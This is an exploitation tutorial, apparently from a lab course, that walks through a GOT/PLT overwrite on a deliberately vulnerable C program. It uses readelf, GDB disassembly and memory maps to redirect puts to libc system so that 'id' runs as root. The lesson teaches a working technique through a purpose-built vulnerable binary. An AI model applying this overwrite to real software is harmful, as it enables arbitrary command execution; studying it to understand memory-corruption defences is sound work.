# GOT/PLT Overwrite Example

## Introduction

We will perform a GOT/PLT overwrite. This works even if ASLR is enabled.
A write-what-where-once vulnerability is being used.

## Files

Source directory: `~/challenges/challenge18/`

There is one relevant file:
* challenge18.c

You can compile it by typing `make`.


## Source

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Set memory[loc] = a
void bof(long a, long loc) {
        long *ptr = (void*) (long) loc;
        *ptr = a;
}

int main(int argc, char **argv) {
  system(""); // load system system-call
  if (argc != 3) {
    printf("Usage: %s <value-to-write> <destination-memory-address>\n", argv[0]);
    printf("       %s 0x1337 0x08080808\n", argv[0]);
    exit(1);
  }

  printf("Start\n"); // load puts system call
  bof( (long)strtol(argv[1], NULL, 16), (long)strtol(argv[2], NULL, 16));

  // System call we overwrite with system()
  printf("id \n");
}

```

The binary will write an long integer as argument 1 into the memory location
indicated by argument 2. It is basically a write-what-where vulnerability which
can be called once.

We will overwrite the GOT entry for the last `printf()` statement, which sadly
is a `put()` in the code, with the address of `system()`.

## Non-crashing usage

Lets find a random memory location we can write on, without breaking things.

```
root@hlUbuntu64:~/challenges/challenge18# readelf -l -S challenge18 | less

There are 31 section headers, starting at offset 0x1a98:
There are 31 section headers, starting at offset 0x1a98:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
[...]

  [19] .init_array       INIT_ARRAY       0000000000600e10  00000e10
       0000000000000008  0000000000000000  WA       0     0     8
  [20] .fini_array       FINI_ARRAY       0000000000600e18  00000e18
       0000000000000008  0000000000000000  WA       0     0     8
  [21] .jcr              PROGBITS         0000000000600e20  00000e20
       0000000000000008  0000000000000000  WA       0     0     8
  [22] .dynamic          DYNAMIC          0000000000600e28  00000e28
       00000000000001d0  0000000000000010  WA       6     0     8
  [23] .got              PROGBITS         0000000000600ff8  00000ff8
       0000000000000008  0000000000000008  WA       0     0     8

  [24] .got.plt          PROGBITS         0000000000601000  00001000
       0000000000000040  0000000000000008  WA       0     0     8
  [25] .data             PROGBITS         0000000000601040  00001040
       0000000000000010  0000000000000000  WA       0     0     8
  [26] .bss              NOBITS           0000000000601050  00001050
       0000000000000008  0000000000000000  WA       0     0     1
[...]
  W (write), A (alloc), X (execute), M (merge), S (strings), l (large)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)


```

These are the sections which are writable (`W`). A quick look on the process layout
shows though that the readelf output doesnt match the reality:

```
root@hlUbuntu64:/proc/22073# cat maps
00400000-00401000 r-xp 00000000 00:43 49586                              /root/challenges/challenge18/challenge18
00600000-00601000 r--p 00000000 00:43 49586                              /root/challenges/challenge18/challenge18
00601000-00602000 rw-p 00001000 00:43 49586                              /root/challenges/challenge18/challenge18
[...]
```

The writeable segment starts at `0x601000`, and not at `0x600e10` as expected.

This is because of aligning the segments, e.g. align 0x200000:
```
[...]
  Program Headers:
    Type           Offset             VirtAddr           PhysAddr
                   FileSiz            MemSiz              Flags  Align
    PHDR           0x0000000000000040 0x0000000000400040 0x0000000000400040
                   0x00000000000001f8 0x00000000000001f8  R E    8
    INTERP         0x0000000000000238 0x0000000000400238 0x0000000000400238
                   0x000000000000001c 0x000000000000001c  R      1
        [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
    LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
                   0x0000000000000924 0x0000000000000924  R E    200000
    LOAD           0x0000000000000e10 0x0000000000600e10 0x0000000000600e10
                   0x0000000000000240 0x0000000000000248  RW     200000
    DYNAMIC        0x0000000000000e28 0x0000000000600e28 0x0000000000600e28
                   0x00000000000001d0 0x00000000000001d0  RW     8
    NOTE           0x0000000000000254 0x0000000000400254 0x0000000000400254
                   0x0000000000000044 0x0000000000000044  R      4
```

Anyway, lets use `0x00601000` as dummy address to write a random value to:

```
root@hlUbuntu64:~/challenges/challenge18# ./challenge18 0x1337 0x00601000
Start
id
```

As we an see, we `printf()` the text string `id`. The goal is to execute that string instead.

## Analysis

Lets load it into GDB and see how the function call's to the LIBC functions
`puts` and `system` are handled. Note that even though we use `printf()` in
the source code, the compiler will change it to `puts` if it does not have
any arguments.

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000400668 <+0>:     push   rbp
   0x0000000000400669 <+1>:     mov    rbp,rsp
   0x000000000040066c <+4>:     push   rbx
   0x000000000040066d <+5>:     sub    rsp,0x18
   0x0000000000400671 <+9>:     mov    DWORD PTR [rbp-0x14],edi
   0x0000000000400674 <+12>:    mov    QWORD PTR [rbp-0x20],rsi
   0x0000000000400678 <+16>:    mov    edi,0x4007b8
   0x000000000040067d <+21>:    call   0x4004f0 <system@plt>   # system() get loaded into the GOT
   0x0000000000400682 <+26>:    cmp    DWORD PTR [rbp-0x14],0x3
   0x0000000000400686 <+30>:    je     0x4006c4 <main+92>
   0x0000000000400688 <+32>:    mov    rax,QWORD PTR [rbp-0x20]
   0x000000000040068c <+36>:    mov    rax,QWORD PTR [rax]
   0x000000000040068f <+39>:    mov    rsi,rax
   0x0000000000400692 <+42>:    mov    edi,0x4007c0
   0x0000000000400697 <+47>:    mov    eax,0x0
   0x000000000040069c <+52>:    call   0x400500 <printf@plt>
   0x00000000004006a1 <+57>:    mov    rax,QWORD PTR [rbp-0x20]
   0x00000000004006a5 <+61>:    mov    rax,QWORD PTR [rax]
   0x00000000004006a8 <+64>:    mov    rsi,rax
   0x00000000004006ab <+67>:    mov    edi,0x4007f9
   0x00000000004006b0 <+72>:    mov    eax,0x0
   0x00000000004006b5 <+77>:    call   0x400500 <printf@plt>
   0x00000000004006ba <+82>:    mov    edi,0x1
   0x00000000004006bf <+87>:    call   0x400530 <exit@plt>
   0x00000000004006c4 <+92>:    mov    edi,0x400816
   0x00000000004006c9 <+97>:    call   0x4004e0 <puts@plt>    # puts get loaded into the GOT
   0x00000000004006ce <+102>:   mov    rax,QWORD PTR [rbp-0x20]
   0x00000000004006d2 <+106>:   add    rax,0x10
   0x00000000004006d6 <+110>:   mov    rax,QWORD PTR [rax]
   0x00000000004006d9 <+113>:   mov    edx,0x10
   0x00000000004006de <+118>:   mov    esi,0x0
   0x00000000004006e3 <+123>:   mov    rdi,rax
   0x00000000004006e6 <+126>:   call   0x400520 <strtol@plt>
   0x00000000004006eb <+131>:   mov    rbx,rax
   0x00000000004006ee <+134>:   mov    rax,QWORD PTR [rbp-0x20]
   0x00000000004006f2 <+138>:   add    rax,0x8
   0x00000000004006f6 <+142>:   mov    rax,QWORD PTR [rax]
   0x00000000004006f9 <+145>:   mov    edx,0x10
   0x00000000004006fe <+150>:   mov    esi,0x0
   0x0000000000400703 <+155>:   mov    rdi,rax
   0x0000000000400706 <+158>:   call   0x400520 <strtol@plt>
   0x000000000040070b <+163>:   mov    rsi,rbx
   0x000000000040070e <+166>:   mov    rdi,rax
   0x0000000000400711 <+169>:   call   0x400646 <bof>         # execute the vulnerability
   0x0000000000400716 <+174>:   mov    edi,0x40081c
   0x000000000040071b <+179>:   call   0x4004e0 <puts@plt>    # execute puts() again. Lets modify this.
   0x0000000000400720 <+184>:   mov    eax,0x0
   0x0000000000400725 <+189>:   add    rsp,0x18
   0x0000000000400729 <+193>:   pop    rbx
   0x000000000040072a <+194>:   pop    rbp
   0x000000000040072b <+195>:   ret
```

It appears that `system` is located at `0x4004f0`, whereas `printf` is located
at `0x400500`. Lets have a look. Note that we perform a `call`, so we need to
disassemble the memory locations, as it contains function code:

```
gdb-peda$ disas 0x4004f0
Dump of assembler code for function system@plt:
   0x00000000004004f0 <+0>:     jmp    QWORD PTR [rip+0x200b2a]        # 0x601020
   0x00000000004004f6 <+6>:     push   0x1
   0x00000000004004fb <+11>:    jmp    0x4004d0
End of assembler dump.

gdb-peda$ disas 0x4004e0
Dump of assembler code for function puts@plt:
   0x00000000004004e0 <+0>:     jmp    QWORD PTR [rip+0x200b32]        # 0x601018
   0x00000000004004e6 <+6>:     push   0x0
   0x00000000004004eb <+11>:    jmp    0x4004d0
End of assembler dump.

```

These stub function in the PLT just do a jump to a memory location. These are relative
to RIP, but luckily GDB already prints the two destination addresses at the back;
`0x601020` and `0x601018`.

Lets have a look whats there. Not that we just want to access the value at that
memory location, as this is what gets jumped to.

```
gdb-peda$ x/1xg 0x601020
0x601020:       0x00000000004004f6

gdb-peda$ x/1xg 0x601018
0x601018:       0x00000000004004e6
```

And now, these destination addresses:
```
gdb-peda$ disas 0x00000000004004f6
Dump of assembler code for function system@plt:
   0x00000000004004f0 <+0>:     jmp    QWORD PTR [rip+0x200b2a]        # 0x601020
   0x00000000004004f6 <+6>:     push   0x1
   0x00000000004004fb <+11>:    jmp    0x4004d0
End of assembler dump.

gdb-peda$ disas 0x00000000004004e6
Dump of assembler code for function puts@plt:
   0x00000000004004e0 <+0>:     jmp    QWORD PTR [rip+0x200b32]        # 0x601018
   0x00000000004004e6 <+6>:     push   0x0
   0x00000000004004eb <+11>:    jmp    0x4004d0
End of assembler dump.

```

They point back into the PLT! But one command later, that the `push`.
As the dynamic linker didnt execute yet,
the GOT entries point back to the PLT, where the dynamic linker will be executed.
It will find the memory location of the functions, and write it into the GOT.
The `push 1/2` is necessary for the dynamic linker to know where to write the result.

Lets break at a location where both functions have been executed at least once,
like exactly before calling `bof()`. At that time, the GOT should contain the
resolved shared libary addresses.

Note that we tell GDB to only debug the main parent. The first `system()` will
fork a child, which we are not interested in. We also set the breakpoint directly
to the address, instead of relative to main, for reasons.

```
gdb-peda$ set follow-fork-mode parent
gdb-peda$ b *0x0000000000400711
Breakpoint 1 at 0x400711
gdb-peda$ r 0x0 0x0
Starting program: /root/challenges/challenge18/challenge18 0x0 0x0
Start
[...]
Breakpoint 1, 0x0000000000400711 in main ()
gdb-peda$

```

Lets have a look at the GOT again. We can re-use the addresses from above:
```
gdb-peda$ x/1xg 0x601020
0x601020:       0x00007ffff7a53380

gdb-peda$ x/1xg 0x601018
0x601018:       0x00007ffff7a7d5d0
```

The values have changed. Whats behind them?
```
gdb-peda$ x/1i 0x00007ffff7a53380
   0x7ffff7a53380 <__libc_system>:      test   rdi,rdi
gdb-peda$ x/1i 0x00007ffff7a7d5d0
   0x7ffff7a7d5d0 <_IO_puts>:   push   r12
```

We are just interested in the symbol, not the code. Seems at address `0x00007ffff7a53380`,
libc `system` is located. This matches the memory mappings:

```
gdb-peda$ info proc mappings
process 22243
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /root/challenges/challenge18/challenge18
            0x600000           0x601000     0x1000        0x0 /root/challenges/challenge18/challenge18
            0x601000           0x602000     0x1000     0x1000 /root/challenges/challenge18/challenge18
            0x602000           0x623000    0x21000        0x0 [heap]
    =>0x7ffff7a0e000     0x7ffff7bce000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7bce000     0x7ffff7dcd000   0x1ff000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dcd000     0x7ffff7dd1000     0x4000   0x1bf000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dd1000     0x7ffff7dd3000     0x2000   0x1c3000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dd3000     0x7ffff7dd7000     0x4000        0x0
      0x7ffff7dd7000     0x7ffff7dfd000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7fed000     0x7ffff7ff0000     0x3000        0x0
      0x7ffff7ff5000     0x7ffff7ff7000     0x2000        0x0
      0x7ffff7ff7000     0x7ffff7ffa000     0x3000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

So we have this:
```
GOT                   Points to
0x601020 (system)     0x00007ffff7a53380 (__libc_system)
0x601018 (puts)       0x00007ffff7a7d5d0 (_IO_puts)
```


## Exploit

We want to have this:
```
GOT                   Points to
0x601020 (system)     0x00007ffff7a53380 (__libc_system)
0x601018 (puts)       0x00007ffff7a53380 (__libc_system)
```

The exploit is simple. Write `0x00007ffff7a53380` to memory address `0x601018`:
```
gdb-peda$ r 0x00007ffff7a53380 0x601018
Starting program: /root/challenges/challenge18/challenge18 0x00007ffff7a53380 0x601018
Start
uid=0(root) gid=0(root) groups=0(root)
[Inferior 2 (process 22261) exited normally]
Warning: not running or target is remote
```

Success! Instead of printing the string `"id"`, it got executed (output `"uid=0(root)..."`)


## Challenges
